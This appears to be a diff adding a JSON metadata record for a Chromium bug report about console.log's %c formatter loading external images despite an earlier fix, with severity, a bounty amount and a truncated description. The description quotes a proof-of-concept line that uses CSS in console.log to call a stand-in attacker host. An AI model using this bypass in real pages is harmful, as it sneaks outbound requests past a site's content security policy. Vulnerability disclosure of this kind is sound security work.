@@ -1,0 +1,27 @@
+{
+  "id": "40060475",
+  "url": "https://issues.chromium.org/issues/40060475",
+  "title": "Security: console.log still allows loading images via %c formatter",
+  "status": "Accepted",
+  "severity": "S3-Low",
+  "priority": "P3",
+  "component": "Blink>SecurityFeature>ContentSecurityPolicy, Platform>DevTools",
+  "os_platforms": [
+    "Linux",
+    "Mac",
+    "Windows",
+    "ChromeOS"
+  ],
+  "chrome_version": null,
+  "cve_ids": [],
+  "reporter": "ma...@gmail.com",
+  "assignee": "sz...@chromium.org",
+  "created_date": "2022-08-02T20:04:04+00:00",
+  "modified_date": "2024-01-09T06:24:58+00:00",
+  "bounty_confirmed": true,
+  "bounty_amount": 500.0,
+  "bounty_rationale": null,
+  "attachments": [],
+  "update_count": 32,
+  "description_snippet": "**VULNERABILITY DETAILS**   \nI noticed that the fix for https://crbug.com/chromium/1223475 is imcomplete.  \nAn attacker can still load images via the console.log.  \n  \n  \nPoC #1:  \nconsole.log(\"%caaa\",\"background:url(httpS://attacker.example.com/)\")  \n  \n  \nPoC #2:  \nconsole.log(\"%caaa\",\"background:"
+}
